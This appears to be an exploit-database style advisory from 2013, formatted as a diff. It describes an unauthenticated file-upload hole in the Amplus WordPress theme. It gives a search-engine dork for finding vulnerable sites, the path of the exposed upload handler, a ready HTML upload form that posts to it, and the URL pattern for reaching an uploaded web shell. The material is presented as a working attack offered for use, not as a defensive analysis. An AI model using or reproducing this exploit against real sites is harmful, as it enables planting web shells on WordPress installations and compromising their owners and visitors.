@@ -1,0 +1,48 @@
+#Title : Wordpress Amplus Themes CSRF File Upload Vulnerability
+
+#Author : DevilScreaM
+
+#Date : 11/17/2013 - 17 November 2013
+
+#Category : Web Applications
+
+#Type : PHP
+
+#Vendor : http://themeforest.net
+
+#Download : http://themeforest.net/item/amplus-responsive-multilingual-wordpress-theme/
+
+#Greetz : 0day-id.com | newbie-security.or.id | Borneo Security | Indonesian Security
+     Indonesian Hacker | Indonesian Exploiter | Indonesian Cyber
+
+#Thanks : ShadoWNamE | gruberr0r | Win32Conficker | Rec0ded |
+
+#Tested : Mozila, Chrome, Opera -> Windows & Linux
+
+#Vulnerabillity : CSRF
+
+#Dork : 
+
+inurl:wp-content/themes/amplus
+
+
+CSRF File Upload Vulnerability
+
+Exploit & POC : 
+
+http://site-target/wp-content/themes/amplus/functions/upload-handler.php
+
+Script :
+
+<form enctype="multipart/form-data"
+action="http://127.0.0.1/wp-content/themes/amplus/functions/upload-handler.php" method="post"> 
+Your File: <input name="uploadfile" type="file" /><br /> 
+<input type="submit" value="upload" /> 
+</form> 
+
+
+File Access :
+
+http://site-target/uploads/[years]/[month]/your_shell.php
+
+Example : http://127.0.0.1/wp-content/uploads/2013/11/devilscream.php
